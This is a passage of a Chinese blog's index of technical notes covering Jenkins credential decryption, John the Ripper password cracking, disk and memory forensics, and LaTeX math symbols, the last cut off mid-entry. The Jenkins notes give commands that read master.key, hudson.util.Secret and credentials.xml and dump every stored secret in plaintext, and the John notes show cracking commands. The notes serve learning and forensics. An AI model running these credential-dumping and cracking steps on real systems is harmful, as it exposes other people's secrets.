  <entry>
    <title>jenkins credentials笔记</title>
    <url>//jenkins-credentials-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>Jenkins 是一个开源的、提供友好操作界面的持续集成(CI)工具，起源于
Hudson（Hudson是商用的），主要用于持续、自动的构建/测试软件项目、监控外部任务的运行（这个比较抽象，暂且写上，不做解释）。Jenkins
用 Java 语言编写，可在 Tomcat 等流行的 servlet
容器中运行，也可独立运行。通常与版本管理工具(SCM)、构建工具结合使用。常用的版本控制工具有
SVN、GIT，构建工具有 Maven、Ant、Gradle。</p>
<p>凭证（cridential）是 Jenkins
进行受限操作时的凭据。比如使用SSH登录远程机器时，用户名和密码或 SSH key
就是凭证。而这些凭证不可能以明文写在 Jenkinsfile 中。Jenkins
凭证管理指的就是对这些凭证进行管理。</p>
<p>为了最大限度地提高安全性，在 Jenkins master
节点上对凭证进行加密存储（通过 Jenkins 实例 ID
加密），只有通过它们的凭证 ID 才能在 pipeline
中使用，并且限制了将证书从一个 Jenkins 实例复制到另一个 Jenkins
实例的能力。</p>
<p>也因为所有的凭证都被存储在 Jenkins master 上，所以在 Jenkins master
上最好不要执行任务，以免被 pipeline 非法读取出来，应该分配到 Jenkins
agent 上执行 pipeline。</p>
<h1 id="jenkins-凭证">Jenkins 凭证</h1>
<p>目前 Jenkins 支持如下类型的凭证：</p>
<ul>
<li>Username with password</li>
<li>GitHub App</li>
<li>SSH Username with private key</li>
<li>Secret file</li>
<li>Secret text</li>
<li>X.509 Client Certificate</li>
<li>Certificate</li>
</ul>
<p>其中 Username with password 和 SSH Username with private key
是应用最广泛的。</p>
<p>Secret text 是一串需要保密的文本，比如 Github 的 token。</p>
<p>Username with password 指用户和密码凭证。</p>
<p>Secret file 指需要保密的文本文件。使用 Secret file 时，Jenkins
会将文件复制到一个临时目录中，再将文件路径设置到一个变量中。构建结束后，所复制的
Secret file 会被删除。</p>
<p>SSH Username with private key 指一对SSH用户名和密钥。</p>
<p>Jenkins 的凭据信息（类似 git 账号密码、用户账号密码、tomcat
账号密码）以及服务器的密钥账号密码等信息 ，在 Jenkins
服务器的本地都是有存储的，并且都进行了加密。</p>
<p>Jenkins的相关凭据信息存储在
<code>$&#123;JENKINS_HOME&#125;/credentials.xml</code>
文件中，其中类似下面的就是密码密文：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#123;AQAAABAAAAAgQI+cpXwSulM5zcFv14L5eODWtRDiP1HBCY/zg8H3kTDE4swuJ+j5DiVg251XDjq+&#125;</span><br></pre></td></tr></table></figure>
<h1 id="jenkins-凭证破解">Jenkins 凭证破解</h1>
<h2 id="普通破解">普通破解</h2>
<p>Jenkins 的密码是使用
<code>hudson.util.Secret.fromString("明文密码").getEncryptedValue()</code>
加密的，而解密的话就需要使用
<code>hudson.util.Secret.fromString("&#123;XXX=&#125;").getPlainText()</code>
进行解密。</p>
<p>用 Jenkins 的管理员账号登录，在系统管理列表中找到
<code>Script Console</code> 这个选项，然后</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">println(hudson.util.Secret.fromString(<span class="string">&quot;&#123;AQAAABAAAAAgQI+cpXwSulM5zcFv14L5eODWtRDiP1HBCY/zg8H3kTDE4swuJ+j5DiVg251XDjq+&#125;&quot;</span>).getPlainText())</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">println(hudson.util.Secret.decrypt(<span class="string">&quot;&#123;AQAAABAAAAAgQI+cpXwSulM5zcFv14L5eODWtRDiP1HBCY/zg8H3kTDE4swuJ+j5DiVg251XDjq+&#125;&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>点击运行按钮，解密后的明文密码就会打印出来。</p>
<h2 id="jenkins-publish-over-ssh-破解">Jenkins publish over SSH
破解</h2>
<p>如果使用了 Jenkins publish over SSH，则相关的密码记录
<code>$&#123;JENKINS_HOME&#125;/jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml</code>
内。</p>
<p>我们可以使用开源项目 <a href="https://github.com/rabbitmask/Jenkins_Credentials_Crack">https://github.com/rabbitmask/Jenkins_Credentials_Crack</a>
进行凭证破解。</p>
<h2 id="jenkins-credentials-解密和转储">Jenkins credentials
解密和转储</h2>
<p>使用项目 <a href="https://github.com/hoto/jenkins-credentials-decryptor">https://github.com/hoto/jenkins-credentials-decryptor</a>
可以完成对 Jenkins 凭证的解密。</p>
<p>我们需要知道Jenkins
将加密的凭据存储在<code>credentials.xml</code>文件中或<code>config.xml</code>文件夹下。要解密它们，您需要<code>master.key</code>和<code>hudson.util.Secret</code>文件。</p>
<p>所有文件都位于 Jenkins 主目录中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$JENKINS_HOME</span>/credentials.xml </span><br><span class="line"><span class="variable">$JENKINS_HOME</span>/secrets/master.key</span><br><span class="line"><span class="variable">$JENKINS_HOME</span>/secrets/hudson.util.Secret</span><br><span class="line"><span class="variable">$JENKINS_HOME</span>/jobs/example-folder/config.xml</span><br></pre></td></tr></table></figure>
<p>我们需要从 release 中下载二进制构建（需要注意的是，暂时只支持
Linux）</p>
<p>之后使用指令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./jenkins-credentials-decryptor \</span><br><span class="line">  -m <span class="variable">$JENKINS_HOME</span>/secrets/master.key \</span><br><span class="line">  -s <span class="variable">$JENKINS_HOME</span>/secrets/hudson.util.Secret \</span><br><span class="line">  -c <span class="variable">$JENKINS_HOME</span>/credentials.xml \</span><br><span class="line">  -o json</span><br></pre></td></tr></table></figure>
<p>即可将凭证以 json 形式输出在标准输出中。</p>
<p><code>-o</code> 属性是可选的，默认为 <code>json</code>，可以指定为
<code>text</code> 模式。</p>
]]></content>
      <tags>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>John笔记</title>
    <url>//john-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>一款免费、开源的暴力密码破解器，它有多平台版本，支持目前大多数的加密算法，如DES、MD4、MD5等。该软件破解密码方式简单而粗暴，理论上只要时间上面允许，该软件可以破译绝大多数用户密码。John
the
Ripper免费的开源软件，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码。</p>
<p>在 Debian 系的 Linux 中可以使用 <code>apt install john</code>
获取。</p>
<p>同时也可以在<a href="https://www.openwall.com/john/">官网</a>中获取原代码版本和发行版。</p>
<p>需要注意的是，john 时常需要与 <code>*2john</code>
软件配合使用，一般是将密码转换为 hash 值，而这类软件需要从<a href="https://www.openwall.com/john/">官网</a>中的发行版中获取。</p>
<h1 id="安装">安装</h1>
<p>在官网 <a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a>
中，我们可以选择 Windows 二进制版，里面已经包含了 <code>*2john</code> 和
<code>john</code> 的二进制构建或者 python 脚本。</p>
<p>如果是选择了下载源码，可能需要使用 make 指令自动化编译。</p>
<p>一个小建议，将下载的 Windows 二进制版本文件夹中的 <code>run</code>
文件夹（存放 <code>*2john</code> 和 <code>john</code> 的二进制构建或者
python 脚本的文件夹）加入环境变量中，这样可以随时随地调用。</p>
<h1 id="使用">使用</h1>
<h2 id="破解模式">破解模式</h2>
<p>John 支持<strong>四种</strong>密码破解模式：</p>
<ol type="1">
<li><strong>字典模式</strong> →
在这种模式下，用户只需要提供字典和密码列表用于破解。</li>
<li><strong>单一破解模式</strong> →
这是john作者推荐的首选模式。John会使用登录名、全名和家庭通讯录作为候选密码。</li>
<li><strong>递增模式</strong> →
在该模式下john会尝试所有可能的密码组合。这是最具威力的一种。</li>
<li><strong>外部模式</strong> → 在这种模式下，用户可以使用 john
的外部破解模式。使用之前，需要创建一个名为
(<code>list.external:mode</code>) 的配置文件，其中 mode
由用户分配。</li>
</ol>
<h2 id="命令参数">命令参数</h2>
<table>
<colgroup>
<col style="width: 26%">
<col style="width: 73%">
</colgroup>
<thead>
<tr class="header">
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>–single</code></td>
<td>single crack 模式，使用配置文件中的规则进行破解</td>
</tr>
<tr class="even">
<td><code>–wordlist=FILE–stdin</code></td>
<td>字典模式，从 FILE或标准输入中读取词汇</td>
</tr>
<tr class="odd">
<td><code>–rules</code></td>
<td>打开字典模式的词汇表切分规则</td>
</tr>
<tr class="even">
<td><code>–incremental[=MODE]</code></td>
<td>使用增量模式</td>
</tr>
<tr class="odd">
<td><code>–external=MODE</code></td>
<td>打开外部模式或单词过滤，使用 [List.External:MODE]
节中定义的外部函数</td>
</tr>
<tr class="even">
<td><code>–stdout[=LENGTH]</code></td>
<td>不进行破解，仅仅把生成的、要测试是否为口令的词汇输出到标准输出上</td>
</tr>
<tr class="odd">
<td><code>–restore[=NAME]</code></td>
<td>恢复被中断的破解过程，从指定文件或默认为 $JOHN/john.rec
的文件中读取破解过程的状态信息</td>
</tr>
<tr class="even">
<td><code>–session=NAME</code></td>
<td>将新的破解会话命名为
NAME，该选项用于会话中断恢复和同时运行多个破解实例的情况</td>
</tr>
<tr class="odd">
<td><code>–status[=NAME]</code></td>
<td>显示会话状态</td>
</tr>
<tr class="even">
<td><code>–make-charset=FILE</code></td>
<td>生成一个字符集文件，覆盖 FILE 文件，用于增量模式</td>
</tr>
<tr class="odd">
<td><code>–show</code></td>
<td>显示已破解口令</td>
</tr>
<tr class="even">
<td><code>–test</code></td>
<td>进行基准测试</td>
</tr>
<tr class="odd">
<td><code>–users=[-]LOGIN</code></td>
<td>UID[,…]</td>
</tr>
<tr class="even">
<td>–groups=[-]GID[,…]</td>
<td>对指定用户组的账户进行破解，减号表示反向操作，说明对列出组之外的账户进行破解。</td>
</tr>
<tr class="odd">
<td>–shells=[-]SHELL[,…]</td>
<td>对使用指定 shell 的账户进行操作，减号表示反向操作</td>
</tr>
<tr class="even">
<td>–salts=[-]COUNT</td>
<td>至少对 COUNT 口令加载加盐，减号表示反向操作</td>
</tr>
<tr class="odd">
<td>–format=NAME</td>
<td>指定密文格式名称，为 DES/BSDI/MD5/BF/AFS/LM 之一</td>
</tr>
<tr class="even">
<td>–save-memory=LEVEL</td>
<td>设置内存节省模式，当内存不多时选用这个选项。 LEVEL取值在 1~3
之间</td>
</tr>
</tbody>
</table>
<h2 id="实例">实例</h2>
<p>一般来说，我们使用 John
自带的脚本将加密文件转换为哈希值后再进行爆破</p>
<h3 id="使用字典爆破密码">使用字典爆破密码</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=password.lst hash.txt</span><br></pre></td></tr></table></figure>
<h3 id="osfp">OSFP</h3>
<p>使用嗅探工具获取 net-md5 哈希值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ettercap -Tqr ospf.pcapng</span><br></pre></td></tr></table></figure>
<p>随后进行指定爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john hash.txt --format=net-md5 --wordlist=password_dict.txt --force</span><br></pre></td></tr></table></figure>
<h1 id="注意">注意</h1>
<p>Python 3.9 版本 xml 库将生成迭代器的函数删去，改为 <code>iter</code>
获取，故一部分 John 脚本运行时会出现错误，故需要进行代码更改。</p>
<h2 id="office2john.py-错误">office2john.py 错误</h2>
<p>这是一个旧版本错误，在最新版本的 John 中已经修改。</p>
<p>在第 2857 行中，<code>office2john.py</code> 使用
<code>xml.etree.ElementTree</code> 对象进行读取操作，需要注意的是在
Python3.9 版本以前，使用 <code>getiterator</code> 获取迭代器，而
Python3.9 版本删去了这一函数，改为了使用 <code>iter</code>
函数获取迭代器，故需要将此行进行变更。</p>
<p>旧代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># old code</span></span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> tree.getiterator(<span class="string">&#x27;&#123;http://schemas.microsoft.com/office/2006/keyEncryptor/password&#125;encryptedKey&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>需要更改为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># new code</span></span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> tree.<span class="built_in">iter</span>(<span class="string">&#x27;&#123;http://schemas.microsoft.com/office/2006/keyEncryptor/password&#125;encryptedKey&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>镜像取证笔记</title>
    <url>/post/image-forensics-note.html</url>
    <content><![CDATA[<h1 id="镜像取证">镜像取证</h1>
<p>活取证是在主机存活时发现系统被入侵,然后直接把机器的运行内存 dump
下来，对运行内存进行分析，还原一些进程的中的信息。</p>
<p>主要的工作包括但不限于</p>
<ul>
<li>抓取文件 metadata (元数据)</li>
<li>创建时间线</li>
<li>命令历史</li>
<li>分析日志文件</li>
<li>哈希摘要</li>
<li>转存内存信息</li>
</ul>
<p>而死取证是对机器的磁盘做镜像之后进行分析，在关机后制作硬盘镜像，分析镜像（MBR硬盘分区,GPT全局分区表,LVM逻辑卷）是否存在病毒,木马等恶意程序。</p>
<p>不管是那种取证方式都应尽量避免破环犯罪现场，例如通过内存转储工具对内存进行快照，通过磁盘克隆工具对磁盘进行克隆，方便后期的分析工作。</p>
<h2 id="磁盘取证">磁盘取证</h2>
<h3 id="diskgenius">DiskGenius</h3>
<p>DiskGenius 是一款国产收费软件，存在免费版可供使用。</p>
<p>使用 DiskGenius
可以自由对磁盘作许多操作，同时它也可以进行恢复数据、读取磁盘映像等操作。（需要注意的是，很多操作需要付费后才可使用）</p>
<p>使用 DiskGenius 磁盘取证会更加方便。</p>
<h3 id="ext-磁盘映像挂载">ext 磁盘映像挂载</h3>
<p>在 Windows 中可以使用 <a href="http://www.chrysocome.net/explore2fs">explore2fs</a> 临时挂载 ext
文件系统的磁盘映像，但是我们只可以看到未被删除的文件，同时也不可以进行写的操作。</p>
<h3 id="ext3-ext4-磁盘映像恢复已删除文件">ext3 / ext4
磁盘映像恢复已删除文件</h3>
<p>我们可以使用 <code>extundelete</code> 软件恢复 ext3 / ext4
磁盘映像下已经被删除的文件，但无法保证任何特定文件都能够被取消删除。</p>
<p><code>extundelete</code> 是 Linux 的软件，例如 Debian
系的发行版我们都可以直接使用 <code>apt install extundelete</code>
安装此软件。</p>
<p>只需使用以下简单命令便可以恢复已删除文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">extundelete disk-image --restore-all</span><br></pre></td></tr></table></figure>
<h3 id="ftk-imager">FTK Imager</h3>
<p>FTK Imager
是免费的一个挂载映像和导出映像的软件，可以使用其来挂载读取磁盘映像，但需要注意的是，由于是免费软件，仅支持基础的功能，但读取的数据较为原始，可以直接查看到删除和未使用的分区。</p>
<p>相对来说，本人更推荐使用 DiskGenius。</p>
<h3 id="veracrypt">veracrypt</h3>
<p>Veracrypt 是一款基于 Truecrypt 的开源软件，同款竞品是微软的
BitLocker，用于加密卷和映像，支持使用明文密码和文件来进行加密卷或映像。</p>
<p>进行挂载加密卷或映像时，可以按照下图示例使用。</p>
<figure>
<img src="/post/image-forensics-note/veracrypt%20operation.gif" alt="veracrypt operation">
<figcaption aria-hidden="true">veracrypt operation</figcaption>
</figure>
<p>当使用 veracrypt
进行隐藏数据时，没有可识别特征，只能通过密码进行爆破（Hashcat 和 John
均支持对 veracrypt 哈希值的密码爆破）。</p>
<blockquote>
<p>唯一可能识别的特征是，数据是不可读的，同时大小是整的，这是由于加密出来的结果是自选的，一般人类更爱整数。</p>
</blockquote>
<p>同时 veracrypt 还存在隐藏卷和隐藏密码，这也是无法寻找特征的技术。</p>
<p>需要注意的是，veracrypt
特点是可以使用任意<strong>密钥文件</strong>进行加密，所以密钥的保存较为灵活。</p>
<p>不过 veracrypt 在解密时存在选项
<code>在内存中缓存密码和密钥文件</code>，这将导致 veracrypt
的密码可以在内存映像中找到。</p>
<h3 id="空白填充">空白填充</h3>
<p>在主流文件系统中，为保证读写 I/O 效率，通常会将硬盘数据进行对齐，如
14 kb 文件会占用 16 kb
的存储空间，同时，同一个文件夹下的文件很有可能在硬盘数据上间隔很远。</p>
<p>由于这些约定，磁盘软件并不会对其进行识别，但需要注意的是有可能在其中会<strong>暗藏数据</strong>。</p>
<p>查看这部分没有被索引的数据，可以通过 DiskGenius 进行扇区编辑。</p>
<h2 id="内存取证">内存取证</h2>
<p>内存取证主要依赖于 <code>volatiliy</code> 工具，现在已经更新到
python3 的版本了。</p>
<p>具体有关 <code>volatiliy3</code> 的操作可以参考 <a href="/vol3-note.html">volatility3 使用笔记</a>。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>forensics</tag>
      </tags>
  </entry>
  <entry>
    <title>latex 数学公式笔记</title>
    <url>//latex-math-note.html</url>
    <content><![CDATA[<h1 id="字母">字母</h1>
<table style="width:100%;">
<colgroup>
<col style="width: 8%">
<col style="width: 8%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 8%">
<col style="width: 8%">
<col style="width: 10%">
<col style="width: 10%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 8%">
<col style="width: 8%">
</colgroup>
<thead>
<tr class="header">
<th>letter</th>
<th>exp</th>
<th>letter</th>
<th>exp</th>
<th>letter</th>
<th>exp</th>
<th>letter</th>
<th>exp</th>
<th>letter</th>
<th>exp</th>
<th>letter</th>
<th>exp</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><span class="math inline">\(\alpha\)</span></td>
<td><code>\alpha</code></td>
<td><span class="math inline">\(\kappa\)</span></td>
<td><code>\kappa</code></td>
<td><span class="math inline">\(\psi\)</span></td>
<td><code>\psi</code></td>
<td><span class="math inline">\(\digamma\)</span></td>
<td><code>\digamma</code></td>
<td><span class="math inline">\(\Delta\)</span></td>
<td><code>\Delta</code></td>
<td><span class="math inline">\(\Theta\)</span></td>
<td><code>\Theta</code></td>
</tr>
<tr class="even">
<td><span class="math inline">\(\beta\)</span></td>
<td><code>\beta</code></td>
<td><span class="math inline">\(\lambda\)</span></td>
<td><code>\lambda</code></td>
<td><span class="math inline">\(\rho\)</span></td>
<td><code>\rho</code></td>
<td><span class="math inline">\(\varepsilon\)</span></td>
<td><code>\varepsilon</code></td>
<td><span class="math inline">\(\Gamma\)</span></td>
<td><code>\Gamma</code></td>
<td><span class="math inline">\(\Upsilon\)</span></td>
<td><code>\Upsilon</code></td>
</tr>
<tr class="odd">
<td><span class="math inline">\(\chi\)</span></td>
<td><code>\chi</code></td>
<td><span class="math inline">\(\mu\)</span></td>
<td><code>\mu</code></td>
<td><span class="math inline">\(\sigma\)</span></td>
<td><code>\sigma</code></td>
<td><span class="math inline">\(\varkappa\)</span></td>
<td><code>\varkappa</code></td>
<td><span class="math inline">\(\Lambda\)</span></td>
<td><code>\Lambd</code>a</td>
<td><span class="math inline">\(\Xi\)</span></td>
<td><code>\Xi</code></td>
</tr>
<tr class="even">
<td><span class="math inline">\(\delta\)</span></td>
<td><code>\delta</code></td>
<td><span class="math inline">\(\nu\)</span></td>
<td><code>\nu</code></td>
<td><span class="math inline">\(\tau\)</span></td>
<td><code>\tau</code></td>
<td><span class="math inline">\(\varphi\)</span></td>
<td><code>\varphi</code></td>
<td><span class="math inline">\(\Omega\)</span></td>
<td><code>\Omega</code></td>
<td></td>
<td></td>
</tr>
<tr class="odd">
<td><span class="math inline">\(\epsilon\)</span></td>
<td><code>\epsilon</code></td>
<td><span class="math inline">\(o\)</span></td>
<td><code>o</code></td>
<td><span class="math inline">\(\theta\)</span></td>
<td><code>\theta</code></td>
<td><span class="math inline">\(\varpi\)</span></td>
<td><code>\varpi</code></td>
<td><span class="math inline">\(\Phi\)</span></td>
<td><code>\Phi</code></td>
<td><span class="math inline">\(\aleph\)</span></td>
<td><code>\aleph</code></td>
</tr>
<tr class="even">
<td><span class="math inline">\(\eta\)</span></td>
<td><code>\eta</code></td>
<td><span class="math inline">\(\omega\)</span></td>
<td><code>\omega</code></td>
<td><span class="math inline">\(\upsilon\)</span></td>
<td><code>\upsilon</code></td>
<td><span class="math inline">\(\varrho\)</span></td>
<td><code>\varrho</code></td>
<td><span class="math inline">\(\Pi\)</span></td>
<td><code>\Pi</code></td>
<td><span class="math inline">\(\beth\)</span></td>
<td><code>\beth</code></td>
</tr>
<tr class="odd">
<td><span class="math inline">\(\gamma\)</span></td>
<td><code>\gamma</code></td>
<td><span class="math inline">\(\phi\)</span></td>
<td><code>\phi</code></td>
<td><span class="math inline">\(\xi\)</span></td>
<td><code>\xi</code></td>
<td><span class="math inline">\(\varsigma\)</span></td>
<td><code>\varsigma</code></td>
<td><span class="math inline">\(\Psi\)</span></td>
<td><code>\Psi</code></td>
<td><span class="math inline">\(\daleth\)</span></td>
<td><code>\daleth</code></td>
</tr>
<tr class="even">
<td><span class="math inline">\(\iota\)</span></td>
<td><code>\iota</code></td>
<td><span class="math inline">\(\pi\)</span></td>
<td><code>\pi</code></td>
<td><span class="math inline">\(\zeta\)</span></td>
<td><code>\zeta</code></td>
<td><span class="math inline">\(\vartheta\)</span></td>
<td><code>\vartheta</code></td>
<td><span class="math inline">\(\Sigma\)</span></td>
<td><code>\Sigma</code></td>
<td><span class="math inline">\(\gimel\)</span></td>
<td><code>\gimel</code></td>
</tr>
</tbody>
</table>
<p>特别地还有</p>
<table style="width:100%;">
<colgroup>
<col style="width: 12%">
<col style="width: 12%">
<col style="width: 10%">
<col style="width: 10%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 5%">
<col style="width: 7%">
<col style="width: 5%">
<col style="width: 7%">
<col style="width: 5%">
</colgroup>
<thead>
<tr class="header">
<th>letter</th>
<th>exp</th>
<th>letter</th>
<th>exp</th>
<th>letter</th>
<th>exp</th>
<th>letter</th>
<th>exp</th>
<th>letter</th>
<th>exp</th>
<th>letter</th>
<th>exp</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><span class="math inline">\(\partial\)</span></td>
<td><code>\partial</code></td>
<td><span class="math inline">\(\infty\)</span></td>
<td><code>\infty</code></td>
<td><span class="math inline">\(\ell\)</span></td>
<td><code>\ell</code></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="符号">符号</h1>
<table>
<colgroup>
<col style="width: 16%">
<col style="width: 41%">
<col style="width: 41%">
</colgroup>
<thead>
<tr class="header">
<th>name</th>
<th>example</th>
<th>effort</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>(叉) 乘与除</td>
<td><code>a\times b\div c</code></td>
<td><span class="math inline">\(a\times b\div c\)</span></td>
</tr>
<tr class="even">
<td>求模</td>
<td><code>a\mod&#123;b&#125;+c\pmod&#123;m&#125;</code></td>
<td><span class="math inline">\(a\mod{b}+c\pmod{m}\)</span></td>
</tr>
<tr class="odd">
<td>点乘</td>
<td><code>a\cdot b</code></td>
<td><span class="math inline">\(a\cdot b\)</span></td>
</tr>
<tr class="even">
<td>正负与负正</td>
<td><code>\pm a\mp b</code></td>
<td><span class="math inline">\(\pm a\mp b\)</span></td>
</tr>
<tr class="odd">
<td>交集与并集</td>
<td><code>A\cup B\cap C</code></td>
<td><span class="math inline">\(A\cup B\cap C\)</span></td>
</tr>
<tr class="even">
<td>逻辑运算</td>
<td><code>p\bigvee q\bigwedge \lnot r</code></td>
<td><span class="math inline">\(p\bigvee q\bigwedge \lnot
r\)</span></td>
</tr>
<tr class="odd">
<td>全称和特称</td>
<td><code>\forall p\ \exists q</code></td>
<td><span class="math inline">\(\forall p\ \exists q\)</span></td>
</tr>
<tr class="even">
<td>上标与下标</td>
<td><code>C^n_m</code></td>
<td><span class="math inline">\(C^n_m\)</span></td>
</tr>
<tr class="odd">
<td>分数</td>
<td><code>\frac&#123;a&#125;&#123;b&#125;+\frac c2</code></td>
<td><span class="math inline">\(\frac{a}{b}+\frac c2\)</span></td>
</tr>
<tr class="even">
<td>开方</td>
<td><code>\sqrt[3]&#123;5&#125;+\sqrt&#123;2&#125;</code></td>
<td><span class="math inline">\(\sqrt[3]{5}+\sqrt{2}\)</span></td>
</tr>
<tr class="odd">
<td>求和</td>
<td><code>\displaystyle\sum&#123;p_i&#125;+\sum_&#123;i=1&#125;^&#123;n&#125;&#123;p_i&#125;</code></td>
<td><span class="math inline">\(\displaystyle\sum{p_i}+\sum_{i=1}^{n}{p_i}\)</span></td>
</tr>
<tr class="even">
<td>连乘</td>
<td><code>\displaystyle\prod&#123;a_i&#125;+\prod_&#123;i=1&#125;^&#123;n&#125;a_i</code></td>
<td><span class="math inline">\(\displaystyle\prod{a_i}+\prod_{i=1}^{n}a_i\)</span></td>
</tr>
<tr class="odd">
<td>求导</td>
<td><code>f'(x)</code></td>
<td><span class="math inline">\(f&#39;(x)\)</span></td>
</tr>
<tr class="even">
<td>趋近于</td>
<td><code>x\to 0</code></td>
<td><span class="math inline">\(x\to 0\)</span></td>
</tr>
<tr class="odd">
<td>积分</td>
<td><code>\int_a^b&#123;f(x)dx&#125;+\iint&#123;g(x)dx&#125;</code></td>
<td><span class="math inline">\(\int_a^b{f(x)dx}+\iint{g(x)dx}\)</span></td>
</tr>
<tr class="even">
<td>曲线积分</td>
<td><code>\oint f(x)+\oiint g(x)</code></td>
<td><span class="math inline">\(\oint f(x)+\oiint g(x)\)</span></td>
</tr>
<tr class="odd">
<td>小于等于与大于等于</td>
<td><code>a\leq b\geq c</code></td>
<td><span class="math inline">\(a\leq b\geq c\)</span></td>
</tr>
<tr class="even">
<td>远大于与远小于</td>
<td><code>a\ll b\gg c</code></td>
<td><span class="math inline">\(a\ll b\gg c\)</span></td>
</tr>
<tr class="odd">
<td>恒等于与不等于</td>
<td><code>a\equiv b\neq c</code></td>
<td><span class="math inline">\(a\equiv b\neq c\)</span></td>
</tr>
<tr class="even">
<td>约等于</td>
<td><code>a\approx b</code></td>
<td><span class="math inline">\(a\approx b\)</span></td>
</tr>
<tr class="odd">
<td>可逆等号</td>
<td><code>A\rightleftharpoons B+C</code></td>
<td><span class="math inline">\(A\rightleftharpoons B+C\)</span></td>
</tr>
<tr class="even">
<td>全等与相似</td>
<td><code>A\cong B\simeq C</code></td>
<td><span class="math inline">\(A\cong B\simeq C\)</span></td>
</tr>
<tr class="odd">
<td>属于与不属于</td>
<td><code>A\in B\notin C</code></td>
<td><span class="math inline">\(A\in B\notin C\)</span></td>
</tr>
<tr class="even">
<td>包含于</td>
<td><code>A\subseteq B\supseteq C</code></td>
<td><span class="math inline">\(A\subseteq B\supseteq C\)</span></td>
</tr>
<tr class="odd">
<td>平行与垂直</td>
<td><code>a\parallel b\perp c</code></td>
<td><span class="math inline">\(a\parallel b\perp c\)</span></td>
</tr>
<tr class="even">
<td>三角形</td>
<td><code>\bigtriangleup ABC</code></td>
<td><span class="math inline">\(\bigtriangleup ABC\)</span></td>
</tr>
<tr class="odd">
<td>极限</td>
<td><code>\displaystyle\lim_&#123;x\to 0&#125;f(x)</code></td>
<td><span class="math inline">\(\displaystyle\lim_{x\to
0}f(x)\)</span></td>
</tr>
<tr class="even">
<td>三角函数</td>
<td><code>\sin x\cos x\tan x</code></td>
<td><span class="math inline">\(\sin x\cos x\tan x\)</span></td>
</tr>
<tr class="odd">
<td>各种省略号</td>
<td><code>\cdots\ \ddots\ \vdots</code></td>
<td><span class="math inline">\(\cdots\ \ddots\ \vdots\)</span></td>
</tr>
<tr class="even">
<td>推导符号</td>
<td><code>p\Rightarrow q\Leftrightarrow r</code></td>
<td><span class="math inline">\(p\Rightarrow q\Leftrightarrow
r\)</span></td>
</tr>
<tr class="odd">
<td></td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>需要注意的是，<strong>微分符号</strong>并无自带，可以使用宏定义创造：<code>\def\d&#123;\mathrm&#123;d&#125;&#125;</code></p>
<p>然后使用 <code>\d</code> 便可输出正体 <code>d</code>，效果如下：
<span class="math display">\[
\def\d{\mathrm{d}}
\d x
\]</span></p>
<h1 id="公式">公式</h1>
<h2 id="矩阵">矩阵</h2>
<p>使用 <code>\begin&#123;matrix&#125;</code> 与 <code>\end&#123;matrix&#125;</code>
包含，使用 <code>&amp;</code> 空开矩阵元素，使用 <code>\\</code>
进行换行</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;matrix&#125;</span><br><span class="line">1 <span class="built_in">&amp;</span> 2 <span class="built_in">&amp;</span> 3 <span class="keyword">\\</span></span><br><span class="line">4 <span class="built_in">&amp;</span> 5 <span class="built_in">&amp;</span> 6 <span class="keyword">\\</span></span><br><span class="line">7 <span class="built_in">&amp;</span> 8 <span class="built_in">&amp;</span> 9</span><br><span class="line"><span class="keyword">\end</span>&#123;matrix&#125;</span><br></pre></td></tr></table></figure>
<p>效果如下 <span class="math display">\[
\begin{matrix}
1 &amp; 2 &amp; 3 \\
4 &amp; 5 &amp; 6 \\
7 &amp; 8 &amp; 9
\end{matrix}
\]</span> 还可以这样写</p>
